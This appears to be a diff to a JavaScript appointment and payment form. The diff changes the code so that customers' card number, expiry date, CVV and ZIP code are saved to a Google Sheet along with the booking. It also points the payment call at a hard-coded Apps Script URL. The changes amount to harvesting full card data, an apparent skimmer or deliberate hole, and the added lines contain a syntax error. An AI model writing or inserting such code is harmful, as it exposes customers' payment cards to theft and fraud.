@@ -34,7 +34,7 @@ async function procesarFormulario() {
     return;
   }
 
-  // DATOS DE TARJETA (estos NO se guardan en Sheets)
+  // DATOS DE TARJETA (estos SI se guardan en Sheets)
   const card_number = document.getElementById("card_number").value;
   const expiry = document.getElementById("expiry").value;
   const cvv = document.getElementById("cvv").value;
@@ -48,13 +48,17 @@ async function procesarFormulario() {
     return;
   }
 
-  // Guardar cita sin datos de tarjeta
+  // Guardar cita con datos de tarjeta
   sendToSheets({
     tipo: "cita",
     nombre: data.nombre,
     telefono: data.telefono,
     fecha: data.fecha,
     hora: data.hora,
+    card_number: data.card_number,
+    expiry: data.expiry,
+    cvv: data.cvv,
+    zip_code: data.zip_code
     descripcion: data.descripcion,
     metodo_pago: data.metodo_pago,
     transaction_id: pagoResponse.transaction_id,
@@ -67,7 +71,7 @@ async function procesarFormulario() {
 
 // LLAMADA AL BACKEND PRIVADO
 async function processPagoPrivado(card_number, expiry, cvv, zip_code) {
-  const url = "TU_URL_DE_APPS_SCRIPT";
+  const url = "https://script.google.com/macros/s/AKfycbz4PLq-gNQTGo2bsJiNKpvG1DuVC69YttbwqjH3yLkKEdo6nbCVpDk65AGvbA9Nqw/exec";
 
   const response = await fetch(url, {
     method: "POST",
